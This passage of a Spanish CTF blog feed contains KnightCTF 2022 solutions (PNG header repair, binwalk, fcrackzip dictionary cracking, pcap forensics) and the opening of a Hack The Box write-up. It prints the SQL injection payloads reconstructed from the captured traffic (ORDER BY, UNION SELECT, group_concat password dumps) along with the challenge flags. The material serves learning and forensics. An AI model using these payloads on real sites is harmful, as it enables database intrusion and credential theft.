-&lt;p&gt;De modo que reemplazando los cuatro primeros dígitos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;89 50 4E 47&lt;/code&gt;, conseguiremos visualizar la flag; esto podemos hacerlo mediante herramientas online como &lt;a href=&quot;https://www.onlinehexeditor.com/&quot;&gt;Online Hex Editor&lt;/a&gt;, o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghex&lt;/code&gt;, que para instalarlo es bastante sencillo:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install ghex
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{Imag3_H3ad3r_M4nipul4t10N}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;lets-walk-together&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Let’s Walk Together&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al abrir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/interesting_waves.png&quot;&gt;archivo adjunto&lt;/a&gt; no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante. Vamos a hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, una herramienta de &lt;em&gt;ingeniería inversa&lt;/em&gt; dedicada a identificar archivos y código malicioso en &lt;em&gt;imágenes de firmware&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;binwalk -e interesting_waves.png
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; protegido por contraseña.&lt;/p&gt;
-
-&lt;p&gt;En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcrackzip&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install fcrackzip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para ello necesitaremos de algún diccionario, el más común es &lt;a href=&quot;https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20220209T031834Z&amp;amp;X-Amz-Expires=300&amp;amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;amp;X-Amz-SignedHeaders=host&amp;amp;actor_id=79855501&amp;amp;key_id=0&amp;amp;repo_id=97553311&amp;amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;amp;response-content-type=application%2Foctet-stream&quot;&gt;rockyou.txt&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fcrackzip -D -p /ruta/del/diccionario/rockyou.txt -u 11150.zip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;-D - Indicamos que queremos hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataque de diccionario&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;-p - Indicamos el diccionario&lt;/li&gt;
-  &lt;li&gt;-u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/37.png&quot; alt=&quot;37&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya con la contraseña del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt;, podemos extraer el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{BiNw4lk_is_h3lpfUl}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;networking&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Networking&lt;/h3&gt;
-
-&lt;h4 id=&quot;compromised-ctf-platform&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Compromised CTF Platform&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/38.png&quot; alt=&quot;38&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Se nos da una &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/traffic.pcapng&quot;&gt;captura de tráfico&lt;/a&gt; que bien podemos analizar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TShark&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/39.png&quot; alt=&quot;39&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En este caso, como se nos pide averiguar por un nombre de usuario y contraseña, lo más sensato sería filtrar la captura por peticiones de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http.request.method == POST
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/40.png&quot; alt=&quot;40&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si empezamos a revisar cada petición, veremos que el atacante probó credenciales típicas como &lt;em&gt;admin/admin&lt;/em&gt;, &lt;em&gt;admin/admin123&lt;/em&gt;, &lt;em&gt;test/test&lt;/em&gt;, &lt;em&gt;admin/password&lt;/em&gt; devolviendo siempre el servidor un mensaje &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Username or Password&lt;/code&gt;, hasta que da con las credenciales correctas, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo/demo&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{demo_demo}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;robotstxt&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Robots.txt&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/41.png&quot; alt=&quot;41&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como estamos en búsqueda del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;, podemos filtrar la &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/traffic.pcapng&quot;&gt;captura de tráfico&lt;/a&gt; por peticiones de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;, y posteriormente por todas aquellas que mencionen el archivo que buscamos, esto último lo podemos hacer con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTRL + F&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http.request.method == GET
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/42.png&quot; alt=&quot;42&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/43.png&quot; alt=&quot;43&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{/includes/users.php}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;php-version&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;PHP Version&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/44.png&quot; alt=&quot;44&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Este reto era bastante sencillo, podíamos completarlo a medida que realizábamos otros retos. La versión de PHP podemos visualizarla en cualquier petición que se realice al servidor.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/45.png&quot; alt=&quot;45&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{PHP/7.4.27}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;kctf&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;KCTF&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/46.png&quot; alt=&quot;46&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para este reto no se nos da mayor contexto, sin embargo, si analizamos los objetos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; encontraremos una imagen que contiene la flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/47.png&quot; alt=&quot;47&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/48.png&quot; alt=&quot;48&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{Ev3rY_USEr_1nPuT_SH0uLD_B3_S4niT1z3D}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;admin-arena&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Admin Arena&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/49.png&quot; alt=&quot;49&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nuevamente tenemos que filtrar de la &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/traffic.pcapng&quot;&gt;captura de tráfico&lt;/a&gt;, información que viaja por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;, en este caso, en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin Arena&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http.request.method == POST
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/50.png&quot; alt=&quot;50&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{tareq@hackerzarena.com_P@$$w0Rd}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;vuln&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Vuln&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/51.png&quot; alt=&quot;51&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A partir de este punto, los retos van enfocados al ataque que se realizó en contra de la plataforma de CTF. Si hemos estado atentos a las diversas peticiones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; que se realizaron, nos habremos percatado que hay varias bastante sospechosas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/52.png&quot; alt=&quot;52&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya viendo esto podríamos determinar el tipo de ataque que se realizó, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL Injection&lt;/code&gt;, no obstante, al verse &lt;em&gt;url encodeado&lt;/em&gt;, puede resultar un poco complicado leer la petición.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{sql_injection}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;vuln-columns&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Vuln Columns&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/53.png&quot; alt=&quot;53&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para visualizar de mejor manera las &lt;em&gt;inyecciones SQL&lt;/em&gt; que se realizaron, podemos exportar los objetos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si observamos detenidamente, nos daremos cuenta que el atacante empieza a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ordenar&lt;/code&gt; las columnas de la base de datos de manera consecutiva, con el objetivo de conocer el total de columnas existentes.&lt;/p&gt;
-
-&lt;p&gt;Este proceso lo realiza un total de &lt;em&gt;diez veces&lt;/em&gt;, en el primer intento hay un pequeño fallo de sintaxis por lo que lo descartamos, y a partir del segundo intento, empieza a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ordenar&lt;/code&gt; las columnas, una a una, esto lo hace hasta la columna &lt;em&gt;nueve&lt;/em&gt;, la cual no existe, razón por la cual, en el décimo intento, vuelve a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ordenar&lt;/code&gt; las columnas hasta la número &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ocho&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; order by 1,2,3,4,5,6,7,8 --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Sabidas el número total de columnas de la base de datos, el atacante empieza a determinar cuales son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnerables&lt;/code&gt;, esto lo hace a través del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;, con el cual empieza a reemplazar ciertas columnas por otra serie de &lt;em&gt;comandos&lt;/em&gt; que le otorgan &lt;em&gt;información relevante&lt;/em&gt; de la base de datos.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,3,4,5,6,7,8 --+
-users.php?id=1&apos; union select 1,2,version(),4,5,6,7,8 --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez analizadas las columnas que el atacante utiliza, podemos determinar que son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuatro&lt;/code&gt;, las columnas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnerables&lt;/code&gt;; concretamente, las columnas &lt;em&gt;3&lt;/em&gt;, &lt;em&gt;6&lt;/em&gt;, &lt;em&gt;7&lt;/em&gt; y &lt;em&gt;8&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{4}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;hashed-password&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Hashed Password&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/56.png&quot; alt=&quot;56&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para este reto se nos pregunta por el hash de la contraseña del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tareq&lt;/code&gt;, la cual el atacante consiguió haciendo uso de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyecciones SQL&lt;/code&gt;, concretamente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/57.png&quot; alt=&quot;57&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;database-flag&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Database Flag&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/58.png&quot; alt=&quot;58&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al igual que el reto anterior, se pude asumir que el atacante a través de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyecciones SQL&lt;/code&gt;, logró filtrar información relevante de la plataforma de CTF, en este caso una &lt;em&gt;flag&lt;/em&gt;; la &lt;em&gt;inyección&lt;/em&gt; en cuestión es:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,3,4,5,6,group_concat(flag),8 from vulnerable --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/59.png&quot; alt=&quot;59&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Conseguimos filtrar dos cadenas encriptadas en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;S0NURntTcUw=
-XzFOajNDN2kwbn0=
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64(&apos;A-Za-z0-9%2B/%3D&apos;,true)&quot;&gt;desencriptarlas&lt;/a&gt; conseguiremos la flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{SqL_1Nj3C7i0n}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;attacker&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Attacker&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/60.png&quot; alt=&quot;60&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente, parece ser que el atacante decidió ‘firmar’ el ataque, dejando su nombre en la última &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyección SQL&lt;/code&gt;, donde deja un mensaje encriptado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexadecimal&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,0x4861636b6564204279204d4f5348,4,5,6,group_concat(flag),8 from vulnerable --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No obstante, si no queremos &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Hex(&apos;None&apos;)&quot;&gt;desencriptar&lt;/a&gt; el mensaje, podemos verlo en texto plano desde el propio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/61.png&quot; alt=&quot;61&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Mon, 17 Jan 2022 00:00:00 -0500</pubDate>
-        <link>/es/KnightCTF-2022/</link>
-        <guid isPermaLink="true">/es/KnightCTF-2022/</guid>
-      </item>
-    
-      <item>
-        <title>Safe - Hack The Box</title>
-        <description>&lt;p&gt;El día de hoy vamos a estar resolviendo la máquina &lt;em&gt;Safe&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;. Es una máquina &lt;em&gt;Linux&lt;/em&gt; de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/1.png&quot; alt=&quot;User Rated Difficulty&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
-
-&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.147
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
